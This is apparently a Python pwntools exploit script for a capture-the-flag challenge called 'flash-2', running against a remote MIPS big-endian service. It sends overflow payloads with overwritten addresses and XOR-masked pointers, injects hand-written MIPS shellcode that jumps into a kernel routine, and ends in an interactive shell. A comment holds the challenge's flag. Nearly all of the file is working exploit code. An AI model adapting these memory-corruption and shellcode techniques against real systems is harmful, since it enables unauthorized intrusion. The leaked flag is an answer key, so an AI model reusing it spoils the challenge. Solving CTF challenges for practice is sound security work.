from pwn import *

# flash-2
# flag{0ff_by_one_crashed_machine_fr0m_kernel_t0_bi0s}
# context.log_level = 'debug'

context.arch='mips'
context.bits=32
context.endian='big'
# p = process('./run.sh')
p = remote('pwnable.org', 21387)
pause()
# 1
log.info('1')
p.recvuntil('Give me flag: ')
z = ''
z += 'AA'
z += 'A'*12
z += 'A'*(0x7c0-0x10)
z += p32(0x800187d0,endianness='big')
z += p32(0x80028004)
z += p32(0x80028004)
z += p32(0x80028004)
z += p32(0x80000814^0xD3ABC0DE,endianness='big')
z += p32(0x80018800^0xD3ABC0DE,endianness='big')
# z += p32(0x44444444^0xD3ABC0DE,endianness='big')
z += 'A'*8
z = z.ljust(0x7f8,'A')
p.sendline('flag{' + z + '}')
z = ''
z += 'B'*6
z += asm('''lui $v0, 0x8002
li $v1, 0x8002
sh $v1, 0($v0)
lui $a0, 0xbfc0
addiu $a0, $a0, 0x16E0
lui $v0, 0x8000
addiu $v0, $v0, 0x1D24
jr $v0
nop
''')
z = z.ljust(0x7f8,'B')
# 2
log.info('2')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + z + '}')
log.info('3')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'CC'*(0x800/2  - 4) + '}')
# 4
log.info('4')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'DD'*(0x800/2  - 4) + '}')
# 5
log.info('5')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'EE'*(0x800/2  - 4) + '}')
# 6
log.info('6')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'FF'*(0x800/2  - 4) + '}')
# 7
log.info('7')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'GG'*(0x800/2  - 4) + '}')
# 8
log.info('8')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'HH'*(0x800/2  - 4) + '}')
# 9
log.info('9')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'II'*(0x800/2  - 4) + '}')
# 10
log.info('10')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'JJ'*(0x800/2  - 4) + '}')
# 11
log.info('11')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'KK'*(0x800/2  - 4) + '}')
# 12
log.info('12')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'LL'*(0x800/2  - 4) + '}')
# 13
log.info('13')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'MM'*(0x800/2  - 4) + '}')
# 14
log.info('14')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'NN'*(0x800/2  - 4) + '}')
# 15
log.info('15')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'OO'*(0x800/2  - 4) + '}')
# 16
log.info('16')
p.recvuntil('Give me flag: ')
z = ''
z += 'P'*0x7bc
z += p32(0x800187d0,endianness='big')
z += p32(0x80028004)
z += p32(0x80028004)
z += p32(0x80028004)
z = z.ljust(0x7f8,'P')
p.sendline('flag{' + z + '}')
log.info('17')
p.recvuntil('Give me flag: ')
p.sendline('flag{' + 'A'*0x7c + '}')
log.info(p.recv(0x200))
pause()
p.interactive()
